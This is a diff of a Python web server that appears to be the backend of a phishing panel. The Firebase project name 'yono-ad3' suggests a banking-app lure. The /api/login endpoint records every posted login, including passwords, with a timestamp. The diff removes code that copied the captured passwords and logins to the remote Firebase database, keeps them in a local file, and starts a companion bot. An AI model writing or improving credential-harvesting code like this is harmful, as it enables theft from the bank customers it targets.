@@ -1,60 +1,42 @@
-import http.server, json, os, time, threading, urllib.request
+import http.server, json, os, time, threading
 from urllib.parse import urlparse, parse_qs
 
-FB = 'https://yono-ad3-default-rtdb.firebaseio.com'
 _DIR = os.path.dirname(os.path.abspath(__file__))
-PASS_FILE = os.path.join(_DIR, 'passwords.json')
-LOG_FILE = os.path.join(_DIR, 'logins.json')
+DB_FILE = os.path.join(_DIR, 'bot_db.json')
 lock = threading.Lock()
 
-def fb_get(p):
-    try:
-        r = urllib.request.urlopen(f'{FB}/{p}.json', timeout=10)
-        return json.loads(r.read())
-    except: return None
+def rd_db():
+    with lock:
+        if os.path.exists(DB_FILE):
+            try:
+                with open(DB_FILE) as f: return json.load(f)
+            except: pass
+        return {"passwords": {}, "logins": []}
 
-def fb_put(p, d):
-    req = urllib.request.Request(f'{FB}/{p}.json', data=json.dumps(d).encode(), method='PUT', headers={'Content-Type':'application/json'})
-    urllib.request.urlopen(req, timeout=10)
+def wr_db(d):
+    with lock:
+        with open(DB_FILE, 'w') as f: json.dump(d, f, indent=2)
 
 def rd_pass():
-    pwds = {}
-    with lock:
-        if os.path.exists(PASS_FILE):
-            try:
-                with open(PASS_FILE) as f: pwds = json.load(f)
-            except: pass
-    if not pwds:
-        fb = fb_get('panel_passwords')
-        if fb: pwds = fb
-    return pwds
+    db = rd_db()
+    return db.get('passwords', {})
 
-def wr_pass(d):
-    with lock:
-        with open(PASS_FILE, 'w') as f: json.dump(d, f)
-    try: fb_put('panel_passwords', d)
-    except: pass
+def wr_pass(pwds):
+    db = rd_db()
+    db['passwords'] = pwds
+    wr_db(db)
 
 def rd_logs():
-    logs = []
-    with lock:
-        if os.path.exists(LOG_FILE):
-            try:
-                with open(LOG_FILE) as f: logs = json.load(f)
-            except: pass
-    if not logs:
-        fb = fb_get('panel_logins')
-        if fb: logs = fb
-    return logs
+    db = rd_db()
+    return db.get('logins', [])
 
 def wr_log(e):
-    logs = rd_logs()
+    db = rd_db()
+    logs = db.get('logins', [])
     logs.append(e)
     logs = logs[-200:]
-    with lock:
-        with open(LOG_FILE, 'w') as f: json.dump(logs, f)
-    try: fb_put('panel_logins', logs)
-    except: pass
+    db['logins'] = logs
+    wr_db(db)
 
 def json_resp(h, code, data):
     h.send_response(code)
@@ -114,7 +96,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 return
 
             if self.path == '/api/login':
-                p = data.get('pass', '')
                 data['ts'] = int(time.time()*1000)
                 wr_log(data)
                 self.wfile.write(json_resp(self, 200, {'ok': True}))
@@ -155,15 +136,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     os.chdir(_DIR)
-    # preload passwords from Firebase into local file
-    fb = fb_get('panel_passwords')
-    if fb:
-        with lock:
-            with open(PASS_FILE, 'w') as f: json.dump(fb, f)
-    fb_l = fb_get('panel_logins')
-    if fb_l:
-        with lock:
-            with open(LOG_FILE, 'w') as f: json.dump(fb_l, f)
     try:
         import threading, importlib.util, sys
         bot_path = os.path.join(_DIR, 'bot.py')
